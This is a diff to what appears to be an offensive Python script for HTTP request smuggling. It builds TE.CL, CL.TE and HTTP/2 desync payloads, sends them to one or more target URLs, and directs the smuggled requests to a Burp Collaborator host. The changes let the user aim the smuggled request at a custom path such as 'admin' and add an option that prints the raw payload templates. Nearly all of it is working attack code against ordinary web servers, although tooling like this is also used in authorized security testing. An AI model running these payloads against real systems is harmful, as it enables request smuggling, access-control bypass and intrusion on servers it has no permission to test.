@@ -25,7 +25,7 @@ def ensure_scheme(url):
 def get_random_user_agent():
     return random.choice(USER_AGENTS)
 
-def te_cl_smuggling(url, collaborator_url):
+def te_cl_smuggling(url, collaborator_url, path):
     headers = {
         "Host": urlparse(url).netloc,
         "Transfer-Encoding": "chunked",
@@ -33,15 +33,16 @@ def te_cl_smuggling(url, collaborator_url):
     }
     body = (
         "0\r\n"
-        f"GET / HTTP/1.1\r\n"
+        f"GET /{path} HTTP/1.1\r\n"
         f"Host: {collaborator_url}\r\n"
         "Connection: close\r\n"
         "\r\n"
     )
     response = requests.post(url, headers=headers, data=body)
+
     return response
 
-def cl_te_smuggling(url, collaborator_url):
+def cl_te_smuggling(url, collaborator_url, path):
     headers = {
         "Host": urlparse(url).netloc,
         "Content-Length": "4",
@@ -49,7 +50,7 @@ def cl_te_smuggling(url, collaborator_url):
     }
     body = (
         f"G\r\n"
-        f"GET / HTTP/1.1\r\n"
+        f"GET /{path} HTTP/1.1\r\n"
         f"Host: {collaborator_url}\r\n"
         "Connection: close\r\n"
         "\r\n"
@@ -58,7 +59,7 @@ def cl_te_smuggling(url, collaborator_url):
     return response
 
 
-def http2_smuggling(url, collaborator_url):
+def http2_smuggling(url, collaborator_url, path):
     print(f"{Fore.MAGENTA}Performing HTTP/2 Request Smuggling on: {Style.RESET_ALL}{url}")
     headers = {
         "Host": urlparse(url).netloc,
@@ -66,7 +67,7 @@ def http2_smuggling(url, collaborator_url):
         "User-Agent": get_random_user_agent()
     }
     body = (
-        "POST / HTTP/1.1\r\n"
+        f"POST /{path} HTTP/1.1\r\n"
         f"Host: {collaborator_url}\r\n"
         "Content-Length: 4\r\n"
         "\r\n"
@@ -77,7 +78,7 @@ def http2_smuggling(url, collaborator_url):
     return response
 
 
-def te_cl_smuggling1(url, collaborator_url):
+def te_cl_smuggling1(url, collaborator_url, path1):
     print(f"Performing TE.CL Request Smuggling on: {url}")
     headers = {
         "Host": urlparse(url).netloc,
@@ -86,7 +87,8 @@ def te_cl_smuggling1(url, collaborator_url):
     }
     body = (
         "0\r\n"
-        f"GET / HTTP/1.1\r\n"
+        "\r\n" #Changed this to add \r\n
+        f"GET /{path1} HTTP/1.1\r\n"
         f"Host: {collaborator_url}\r\n"
         "Connection: close\r\n"
         "\r\n"
@@ -97,7 +99,7 @@ def te_cl_smuggling1(url, collaborator_url):
     return response
 
 
-def cl_te_smuggling1(url, collaborator_url):
+def cl_te_smuggling1(url, collaborator_url, path1):
     print(f"Performing CL.TE Request Smuggling on: {url}")
     headers = {
         "Host": urlparse(url).netloc,
@@ -106,7 +108,7 @@ def cl_te_smuggling1(url, collaborator_url):
     }
     body = (
         f"G\r\n"
-        f"GET / HTTP/1.1\r\n"
+        f"GET /{path1} HTTP/1.1\r\n"
         f"Host: {collaborator_url}\r\n"
         "Connection: close\r\n"
         "\r\n"
@@ -117,7 +119,7 @@ def cl_te_smuggling1(url, collaborator_url):
     return response
 
 
-def http2_smuggling1(url, collaborator_url):
+def http2_smuggling1(url, collaborator_url, path1):
     print(f"{Fore.MAGENTA}Performing HTTP/2 Request Smuggling on: {Style.RESET_ALL}{url}")
     headers = {
         "Host": urlparse(url).netloc,
@@ -125,7 +127,7 @@ def http2_smuggling1(url, collaborator_url):
         "User-Agent": get_random_user_agent()
     }
     body = (
-        "POST / HTTP/1.1\r\n"
+        f"POST /{path1} HTTP/1.1\r\n"
         f"Host: {collaborator_url}\r\n"
         "Content-Length: 4\r\n"
         "\r\n"
@@ -209,7 +211,7 @@ def process_single_url(url, burp_url):
     ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝███████╗
     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
 
-    By: Hacking Notes                                                                                                   
+    By: K, Hacking Notes & ShadowByte                                                                                                  
     """)
     print("Select the option:")
     print(f"{Fore.GREEN}1{Style.RESET_ALL}. HTTP/1.1 Request Smuggling (TE.CL and CL.TE)")
@@ -217,13 +219,15 @@ def process_single_url(url, burp_url):
     print("")
     option = input(f"Enter the option number ({Fore.GREEN}1{Style.RESET_ALL} or {Fore.GREEN}2{Style.RESET_ALL}): ")
     print("")
+    path1 = input(f"Specify a custom path if desired, e.g., admin ({Fore.GREEN}Default Root Path{Style.RESET_ALL}): ")
+    print("")
 
     if option == "1":
-        te_cl_response = te_cl_smuggling1(url, burp_url)
-        cl_te_response = cl_te_smuggling1(url, burp_url)
+        te_cl_response = te_cl_smuggling1(url, burp_url, path1)
+        cl_te_response = cl_te_smuggling1(url, burp_url, path1)
         detailed_check1(te_cl_response, cl_te_response, burp_url)
     elif option == "2":
-        http2_response = http2_smuggling1(url, burp_url)
+        http2_response = http2_smuggling1(url, burp_url, path1)
         print(f"HTTP/2 Response Body: {http2_response.text[:200]}")  # Display first 200 characters of response body
         print(f"{Fore.GREEN}Next steps:{Style.RESET_ALL}")
         print("1. Check the Burp Collaborator server to see if any unexpected requests were received.")
@@ -242,7 +246,7 @@ def process_urls_from_file(file_path, burp_url):
     ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝███████╗
     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
 
-    By: Hacking Notes                                                                                                  
+    By: K, Hacking Notes & ShadowByte                                                                                                  
     """)
 
     print("Select the option:")
@@ -251,9 +255,12 @@ def process_urls_from_file(file_path, burp_url):
     print("")
     option = input(f"Enter the option number ({Fore.GREEN}1{Style.RESET_ALL} or {Fore.GREEN}2{Style.RESET_ALL}): ")
     print("")
+    path = input(f"Specify a custom path if desired, e.g., admin ({Fore.GREEN}Default Root Path{Style.RESET_ALL}): ")
+    print("")
+
 
     for url in urls:
-        process_urls(url, burp_url, option)
+        process_urls(url, burp_url, option, path)
 
     print("")
     print(f"{Fore.GREEN}Next steps:{Style.RESET_ALL}")
@@ -265,13 +272,13 @@ def process_urls_from_file(file_path, burp_url):
     print("")
 
 
-def process_urls(url, burp_url, option):
+def process_urls(url, burp_url, option, path):
     if option == "1":
-        te_cl_response = te_cl_smuggling(url, burp_url)
-        cl_te_response = cl_te_smuggling(url, burp_url)
+        te_cl_response = te_cl_smuggling(url, burp_url, path)
+        cl_te_response = cl_te_smuggling(url, burp_url, path)
         detailed_check(te_cl_response, cl_te_response, url)
     elif option == "2":
-        http2_response = http2_smuggling(url, burp_url)
+        http2_response = http2_smuggling(url, burp_url, path)
         print(f"HTTP/2 Response Body: {http2_response.text[:200]}")  # Display first 200 characters of response body
         print("")
 
@@ -279,9 +286,53 @@ def main():
     parser = argparse.ArgumentParser(description="Request Smuggling Script")
     parser.add_argument("-u", "--url", help="Single URL to test")
     parser.add_argument("-f", "--file", help="File containing multiple URLs to test")
-    parser.add_argument("-b", "--burp", required=True, help="Burp Collaborator URL")
+    parser.add_argument("-b", "--burp", help="Burp Collaborator URL")
+    parser.add_argument("--default", action="store_true", help="Print default message")
 
     args = parser.parse_args()
+
+    if args.default:
+        print(r"""
+te_cl_smuggling
+        "Host": urlparse(url).netloc,
+        "Transfer-Encoding": "chunked",
+        "User-Agent": get_random_user_agent()
+
+        "0\r\n"
+        "\r\n"
+        "GET / HTTP/1.1\r\n"
+        "Host: Host.com\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+
+cl_te_smuggling
+        "Host": urlparse(url).netloc,
+        "Content-Length": "4",
+        "User-Agent": get_random_user_agent()
+
+        "G\r\n"
+        "GET / HTTP/1.1\r\n"
+        "Host: Host.com\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+
+http2_smuggling
+        "Host": urlparse(url).netloc,
+        "TE": "trailers",
+        "User-Agent": get_random_user_agent()
+
+        "POST / HTTP/1.1\r\n"
+        "Host: Host.com\r\n"
+        "Content-Length: 4\r\n"
+        "\r\n"
+        "0\r\n"
+        "SMUGGLED\r\n"
+""")
+        return
+
+    if not args.burp:
+        print("The -b/--burp argument is required unless using --default.")
+        return
 
     if args.url:
         process_single_url(args.url, args.burp)
